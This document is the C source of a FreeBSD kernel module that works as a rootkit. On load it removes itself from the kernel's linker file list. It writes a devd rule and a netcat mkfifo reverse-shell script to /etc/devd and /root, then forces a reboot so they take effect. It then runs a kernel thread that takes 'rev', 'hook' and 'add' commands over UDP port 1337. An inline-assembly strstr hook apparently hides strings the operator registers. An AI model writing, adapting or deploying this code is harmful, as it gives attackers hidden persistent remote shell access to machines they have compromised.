#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/malloc.h>

#include <sys/systm.h>

#include <sys/syscallsubr.h>

#include <sys/kthread.h>

#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/imgact.h>
#include <sys/mac.h>

#include <netinet/in.h>

#include <sys/fcntl.h>
#include <sys/namei.h>
#include <sys/vnode.h>
#include <sys/devctl.h>
#include <sys/bus.h>

#include <sys/reboot.h>

#include <sys/mbuf.h>
#include <net/pfvar.h>
#include <machine/stdarg.h>

#include <sys/linker.h>
#include <sys/mutex.h>

#include <sys/queue.h>

#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/lock.h>
#include <sys/sx.h>

#define INITIAL_CAPACITY 10

static char *strstr_hook(const char *, const char *);

char **stringArray = NULL;
size_t arraySize = 0;
size_t arrayCapacity = INITIAL_CAPACITY;

extern struct sx kld_sx;
extern TAILQ_HEAD(linker_file_list, linker_file) linker_files;

static struct linker_file *lf;

/* 
 * Hook the linker files list to hide the module.
 */
static int hide_module(void) {
	struct linker_file *lf_cur;
	sx_xlock(&kld_sx);
	TAILQ_FOREACH(lf_cur, &linker_files, link) {
		if (strcmp(lf_cur->filename, "custom.ko") == 0) {
			lf = lf_cur;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}
	sx_xunlock(&kld_sx);
	return 0;
}


static void initStringArray(void) {
	stringArray = malloc(INITIAL_CAPACITY * sizeof(char*), M_TEMP, M_WAITOK | M_ZERO);
}

static void addString(const char *str) {
	if (arraySize >= arrayCapacity) {
		arrayCapacity *= 2;
		stringArray = realloc(stringArray, arrayCapacity * sizeof(char*), M_TEMP, M_WAITOK | M_ZERO);
	}

	stringArray[arraySize] = malloc(strlen(str) + 1, M_TEMP, M_WAITOK | M_ZERO);
	strcpy(stringArray[arraySize], str);
	arraySize++;
}

static void printStringArray(void) {
	for (size_t i = 0; i < arraySize; i++) {
		printf("%s\n", stringArray[i]);
	}
}

static void trigger(char *msg) {
	devctl_notify("HELPERSYSTEM", "HELPERSUBSYSTEM", "HELPEREVENT", msg);
}

static void exec_rev(char *msg) {
	devctl_notify("REVSYSTEM", "REVSUBSYSTEM", "REVEVENT", msg);
}

static int file_exist(const char *path) {
	struct nameidata nd;
	int error;

	NDINIT(&nd, LOOKUP, FOLLOW, UIO_SYSSPACE, path);
	error = namei(&nd);
	if (error) {
		return 0; 
	}

	vrele(nd.ni_vp);
	return 1;
}

static int write_to_file(const char *path, char *data, int len) {
	struct nameidata nd;
	struct iovec iov;
	struct uio uio;
	int error;

	struct vattr vattr;
	VATTR_NULL(&vattr);
	vattr.va_type = VREG;		 
	vattr.va_mode = 0777;	 

	NDINIT(&nd, LOOKUP, FOLLOW | LOCKLEAF, UIO_SYSSPACE, path);

	error = namei(&nd);
	if (error) {
		if (error == ENOENT) {
			NDINIT(&nd, CREATE, LOCKPARENT | LOCKLEAF, UIO_SYSSPACE, path);
			error = namei(&nd);
			if (error) {
				return error;
			}

			error = VOP_CREATE(nd.ni_dvp, &nd.ni_vp, &nd.ni_cnd, &vattr);
			if (error) {
				vput(nd.ni_dvp);
				return error;
			}
			vput(nd.ni_dvp); 
		} else {
			return error;
		}
	} else {
		vrele(nd.ni_vp);
	}

	struct vnode *vp = nd.ni_vp;

	iov.iov_base = (void *)data;
	iov.iov_len = len;
	uio.uio_iov = &iov;
	uio.uio_iovcnt = 1;
	uio.uio_resid = iov.iov_len;
	uio.uio_segflg = UIO_SYSSPACE;
	uio.uio_rw = UIO_WRITE;
	uio.uio_td = curthread;
	uio.uio_offset = 0; 

	vn_lock(vp, LK_EXCLUSIVE | LK_RETRY);
	error = VOP_OPEN(vp, FWRITE, curthread->td_ucred, curthread, NULL);
	if (error) {
		printf("\nError VOP_OPEN %d\n", error);
		vput(vp);
		return error;
	}

	error = VOP_WRITE(vp, &uio, 0, curthread->td_ucred);
	printf("\nError VOP_WRITE %d\n", error);
	VOP_CLOSE(vp, FWRITE, curthread->td_ucred, curthread);
	VOP_UNLOCK(vp);
	vput(vp);

	return error;
}

static char *recv_udp_data(struct socket *sock) {
	struct mbuf *m = NULL;
	struct uio uio;
	struct iovec iov;
	int flags = 0;
	char *buffer;

	buffer = malloc(1024, M_TEMP, M_WAITOK | M_ZERO);
	if (buffer == NULL) {
		printf("cannot allocate\n");
		return NULL;
	}

	iov.iov_base = buffer;
	iov.iov_len = 1024;
	uio.uio_iov = &iov;
	uio.uio_iovcnt = 1;
	uio.uio_resid = 1024;
	uio.uio_segflg = UIO_SYSSPACE;
	uio.uio_rw = UIO_READ;
	uio.uio_td = curthread;

	int error = soreceive(sock, NULL, &uio, &m, NULL, &flags);
	if (error)
		return NULL;

	char *dat = NULL;


	if (error == 0) {
		for (struct mbuf *n = m; n != NULL; n = n->m_next) {
		if (n->m_len == 0) {
			continue; 
		}

		if (n->m_len < 2)
			return NULL;
		dat = malloc(1024, M_TEMP, M_WAITOK | M_ZERO);
		char *data = mtod(n, char *);
		for (int i = 0; i < n->m_len; i++) {
			dat[i] = data[i];
		}
		}
	}

	free(iov.iov_base, M_TEMP);
	return dat;
}

static void call_function(const char *input) {
	char func_name[100];
	char params[100];

	sscanf(input, "%s %[^\n]", func_name, params);

	if (strcmp(func_name, "rev") == 0) {
		exec_rev(params);
	} else if (strcmp(func_name, "hook") == 0) {
		char msg[256];
		char address[256];
		if (!strcmp("strstr", params)) {
			printf("Hooking\n");
			sprintf(address, "%p", strstr_hook);
			snprintf(msg, sizeof(msg), "param1=\"%s\" param2=\"%s\"", "strstr", address);
			trigger(msg);
		}
	} else if (strcmp(func_name, "add") == 0) {
		addString(params);
		printStringArray();
	}else {
		printf("Unknown function: %s\n", func_name);
	}
}

static void connector(void *arg) {
	struct socket *so;
	struct sockaddr_in sin;
	int error;
	struct uio uio;
	struct iovec iov;
	char msg[] = "PING\n";

	while (1) {
		error = socreate(AF_INET, &so, SOCK_DGRAM, 0, curthread->td_ucred, curthread);
		if (error) {
			continue;
		}

		bzero(&sin, sizeof(sin));
		sin.sin_len = sizeof(sin);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		sin.sin_port = htons(1337);

		error = soconnect(so, (struct sockaddr *)&sin, curthread);
		if (error) {
			soclose(so);
			continue;
		}

		bzero(&iov, sizeof(iov));
		iov.iov_base = (void *)msg;
		iov.iov_len = sizeof(msg) - 1;

		bzero(&uio, sizeof(uio));
		uio.uio_iov = &iov;
		uio.uio_iovcnt = 1;
		uio.uio_resid = iov.iov_len;
		uio.uio_segflg = UIO_SYSSPACE;
		uio.uio_rw = UIO_WRITE;
		uio.uio_td = curthread;

		error = sosend(so, NULL, &uio, NULL, NULL, 0, curthread);

		char *ret;
		do {
			ret = recv_udp_data(so);
			call_function(ret);
		} while (ret != NULL);


		soclose(so);
	}
}

static char *strstr_hook(const char *s1, const char *s2){
	char *result;
	char *hex_address = "0xffffffff80c498d6"; // strstr address
	int (*func_ptr)(void); 

	sscanf(hex_address, "%p", (int **)&func_ptr);

	void *return_address = &&return_here; 
					   
	/* rewritten bytes
	ffffffff80c498d0: 55				pushq   %rbp
	ffffffff80c498d1: 48 89 e5			movq	%rsp, %rbp
	ffffffff80c498d4: 41 57				pushq   %r15
	*/

	for (size_t i = 0; i < arraySize; i++) {
		if (!strcmp(stringArray[i], s1) || !strcmp(stringArray[i], s2))
	   		return NULL; // got match
	}

	__asm__(
		"pushq %0\n\t"			// Save return address
		"movq %2, %%rdi\n\t"		// First argument (const char *s1)
		"movq %3, %%rsi\n\t"		// Second argument (const char *s2)
		"pushq %%rbp\n\t"		// Push %rbp onto the stack
		"movq %%rsp, %%rbp\n\t"	 	// Move the value of %rsp to %rbp
		"pushq %%r15\n\t"	  	// save r15
		"jmp *%1\n\t"			// jump to func_ptr
		:
		: "r"(return_address), "r"(func_ptr), "r"(s1), "r"(s2)
		: "memory", "%rbp", "%rsi", "%r15"			// Clobbered registers
	);

return_here:
	__asm__("movq %%rax, %0" : "=r" (result) : : "%rax");
	return result;

}

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	struct thread *new_thread = NULL;
	char *devdfile = "notify 100 { match \"system\" \"REVSYSTEM\"; match \"subsystem\" \"REVSUBSYSTEM\"; match \"type\" \"REVEVENT\"; action \"/root/rev.sh $ip $port\"; };\x00";
	char *revsh = "rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc $1 $2 >/tmp/f\x00";

	switch (cmd) {
		case MOD_LOAD:
			hide_module();

			initStringArray();

			if (!file_exist("/etc/devd/rev.conf")) {
				error = write_to_file("/etc/devd/rev.conf", devdfile, strlen(devdfile));
				error = write_to_file("/root/rev.sh", revsh, strlen(revsh));
				kern_reboot(RB_AUTOBOOT);
			}

			error = kthread_add(connector, NULL, NULL, &new_thread, 0, 0, "connector");
			break;
		case MOD_UNLOAD:
			break;
		default:
			error = EOPNOTSUPP;
		break;
	}
	return (error);
}

// Declare the module
static moduledata_t mod_data = {
	"custom", 		// module name
	load,			// event handler
	NULL			// extra data
};

DECLARE_MODULE(custom, mod_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

